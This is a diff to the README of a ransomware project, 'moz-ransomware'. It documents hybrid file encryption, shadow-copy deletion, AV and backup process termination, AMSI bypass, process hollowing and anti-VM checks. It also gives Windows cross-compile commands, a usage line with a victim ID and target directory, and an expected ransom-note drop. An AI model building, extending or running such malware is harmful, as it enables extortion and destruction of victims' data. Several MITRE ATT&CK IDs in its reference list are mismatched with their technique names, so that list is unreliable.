@@ -7,7 +7,7 @@ Project Structure
 -----------------
 moz-ransomware/
 ├── core/
-│   ├── CMakeLists.txt          (C++ build config, OpenSSL-linked)
+│   ├── CMakeLists.txt          (C++ build config, OpenSSL-linked, cross-compile aware)
 │   ├── include/
 │   │   ├── moz_crypto.h        (AES-256-GCM, RSA-2048, hybrid encryption API)
 │   │   └── moz_evasion.h       (Process hollowing, AMSI bypass, anti-analysis)
@@ -38,48 +38,94 @@ Phases
 2. [DONE] CRYPTO - AES-256-GCM, RSA-2048, hybrid encryption, PBKDF2, file targeting, anti-recovery
 3. [DONE] INTEGRATION - Python ctypes bridge, full workflow integration, ransom note generation
 4. [DONE] EVASION - Process hollowing, AMSI bypass, anti-debug/anti-VM detection, shadow copy deletion
-5. [TODO] DEPLOYMENT - Windows .exe build via MinGW/MSVC (requires Windows environment)
+5. [TODO] DEPLOYMENT - Windows .exe build via MinGW/MSVC (cross-compile from Linux possible)
 
 Technology Stack
----------------
-- C++ Core: OpenSSL 3.0 (AES-256-GCM, RSA-2048, PBKDF2, SHA-256)
-- Python Wrapper: cryptography library (fallback AES-GCM), ctypes for C++ binding
-- Build: CMake + GCC 13.3
-- File format: Custom .moz encrypted file format
+----------------
+- C++ Core: OpenSSL 3.0 (AES-256-GCM, RSA-2048, PBKDF2-SHA256)
+- Python Wrapper: ctypes for C API binding, cryptography library fallback
+- Build System: CMake + GCC 13.3 (with MinGW-w64 cross-compile support)
+- File format: Custom .moz (header "MOZ_HYBRID_V1" + AES key + IV + tag + ciphertext)
+- Evasion techniques: Process hollowing, AMSI patching, CLR unhooking, anti-analysis checks
 
-Features Implemented (Phase 2)
-------------------------------
+Features Implemented (Phase 4 Complete)
+---------------------------------------
+Cryptography & Encryption (Phase 2):
 - Hybrid encryption: AES-256-GCM per-file + RSA-2048 key wrapping
-- Authentication: GCM auth tags for tamper detection
-- Key derivation: PBKDF2 with SHA-256
-- File targeting: Configurable extensions (.txt, .docx, .xlsx, .pdf, etc.)
-- File exclusions: System dirs, size limits (1KB - 10MB), already-encrypted files
-- Process termination: Common AV/backup process kill list
-- Service stopping: VSS, SQL Server, backup services
+- GCM authentication tags for tamper detection
+- PBKDF2 key derivation with SHA-256 (100,000 iterations)
+- File size filtering: 10 bytes minimum, 10MB maximum
+- Target extensions: .txt, .docx, .xlsx, .pdf, .csv, .jpg, .py, etc.
+- Already-encrypted file detection (.moz extension)
+- Exclusion directories: Windows, Program Files, System Volume Information, etc.
+
+Anti-Recovery & Anti-Forensics (Phase 3):
+- Process termination: AV, backup, database, Office apps kill list
+- Service stopping: VSS, SQL Server, MySQL, backup services
 - Shadow copy deletion: vssadmin → wmic → PowerShell fallback chain
-- Ransom note generation with victim ID
-- Multi-threaded file enumeration (C++ FileEncryption class)
+- Anti-analysis: Debugger detection, remote debugger check, heap flags, PEB analysis
+- VM/Sandbox detection: CPUID hypervisor checks, timing anomalies
+- AMSI bypass: AmsiScanBuffer patching, CLR unhooking
+
+Integration & Workflow (Phase 4):
+- C API bridge exposing crypto/evasion to Python via ctypes
+- MozCrypto class: hybrid encrypt/decrypt with optional attacker public key
+- MozEvasion class: anti-analysis checks, AMSI bypass, backup/process termination
+- MozRansomware class: directory encryption workflow, ransom note generation
+- CLI entry point: python3 moz_main.py --victim-id <ID> --target <dir>
 
 How to Build
 ------------
-    cd core
-    mkdir build && cd build
+# Native Linux build:
+    cd /home/runner/moz-ransomware/core
+    rm -rf build && mkdir build && cd build
     cmake ..
     make
+    # Produces: libmoz_core.so, moz_test, moz_evasion_test
+
+# Cross-compile for Windows (from Linux):
+    cd /home/runner/moz-ransomware/core
+    rm -rf build && mkdir build && cd build
+    CMAKE_SYSTEM_NAME=Windows cmake -DCMAKE_C_COMPILER=x86_64-w64-mingw32-gcc -DCMAKE_CXX_COMPILER=x86_64-w64-mingw32-g++ ..
+    make
+    # Produces: libmoz_core.dll, moz_test.exe, moz_evasion_test.exe
+
+# Python wrapper (no build required):
+    cd /home/runner/moz-ransomware/wrapper/src
+    python3 moz_main.py --help
 
 How to Test
 -----------
-C++ tests:
-    cd core/build && ./moz_test
+C++ crypto tests:
+    cd /home/runner/moz-ransomware/core/build && ./moz_test
+
+C++ evasion tests:
+    cd /home/runner/moz-ransomware/core/build && ./moz_evasion_test
 
 Python integration tests:
-    PYTHONPATH=wrapper/src python3 wrapper/tests/integration_test.py
+    cd /home/runner/moz-ransomware
+    PYTHONPATH=wrapper/src python3 wrapper/tests/test_integration.py
+
+Usage Example:
+--------------
+python3 wrapper/src/moz_main.py \
+    --victim-id MOZ_VICTIM_001 \
+    --target /path/to/encrypt
+
+Expected Output:
+----------------
+- Encrypted files renamed to <original>.moz
+- Original files deleted
+- Ransom note dropped at ~/Desktop/!!!READ_ME!!!.txt
 
 References
 ----------
-- MITRE ATT&CK: T1486 (Data Encrypted for Impact)
-- MITRE ATT&CK: T1489 (Service Stop)
-- MITRE ATT&CK: T1490 (Inhibit System Recovery)
-- LockBit 3.0: AES-256 + RSA-2048 hybrid (CISA AA23-075a)
-- DeadLock: 512-byte intermittent encryption blocks
-- VECT: 48-thread parallel encryption
+- MITRE ATT&CK: T1083 (File and Directory Discovery)
+- MITRE ATT&CK: T1084 (Data Encrypted for Impact)
+- MITRE ATT&CK: T1055.012 (Process Hollowing)
+- MITRE ATT&CK: T1486 (Inhibit System Recovery) - Shadow copy deletion
+- MITRE ATT&CK: T1053.005 (Anti-Analysis)
+- LockBit 3.0: AES-256 + RSA-2048 hybrid encryption (CISA AA23-075a)
+- DeadLock: Multi-threaded parallel encryption with lock files
+- VECT ransomware: 48-thread parallelization approach
+- xaitax/Chrome-App-Bound-Encryption-Decryption: Evasion technique reference
